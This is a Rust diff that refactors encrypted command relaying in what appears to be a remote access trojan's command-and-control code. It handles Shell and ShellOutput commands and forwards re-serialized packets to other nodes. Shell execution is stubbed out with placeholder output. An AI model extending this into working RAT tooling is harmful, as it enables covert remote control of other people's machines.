@@ -1,4 +1,4 @@
-use crate::{ser_encrypt, unpack_commands, Command, Error};
+use crate::{crypto::ser_encrypt, Packet, Command, Error};
 
 extern crate sodiumoxide;
 use sodiumoxide::crypto::box_ as crypto;
@@ -21,12 +21,7 @@ where
         match cmd {
             Command::Shell(line, recver_pkey) => {
                 let res = format!("<output of `{}`>", line).into_bytes();
-                let encd = ser_encrypt(
-                    &Command::ShellOutput(res),
-                    rat_skey,
-                    &recver_pkey,
-                )?;
-                addons.push(encd);
+                addons.push((recver_pkey, Command::ShellOutput(res)));
             }
             Command::ShellOutput(out) => {
                 println!("Output: {}", std::str::from_utf8(&out).unwrap());
@@ -38,11 +33,14 @@ where
         }
     }
     if !nexts.is_empty() {
-        let mut last_vec: Vec<Vec<u8>> =
+        let (headers, mut bodies): (Vec<Vec<u8>>, Vec<Vec<u8>>) =
             bincode::deserialize(full_bytes).map_err(Error::BincodeFail)?;
-        last_vec.append(&mut addons);
+        for (recver_pkey, new_cmd) in addons.into_iter() {
+            let encd = ser_encrypt(&new_cmd, rat_skey, &recver_pkey)?;
+            bodies.push(encd);
+        }
         let new_packet =
-            bincode::serialize(&last_vec).map_err(Error::BincodeFail)?;
+            bincode::serialize(&(headers, bodies)).map_err(Error::BincodeFail)?;
         for next in nexts {
             send_message(next, &new_packet).map_err(Error::SendFailed)?;
         }
@@ -59,7 +57,7 @@ pub fn packet<FSend>(
 where
     FSend: FnMut(String, &[u8]) -> Result<(), String>,
 {
-    let unpacked = unpack_commands(c2_pkey, rat_skey, bytes)?;
+    let unpacked = Packet::deserialize(bytes, c2_pkey, rat_skey)?;
     commands(unpacked, rat_skey, bytes, send_message)
 }
 
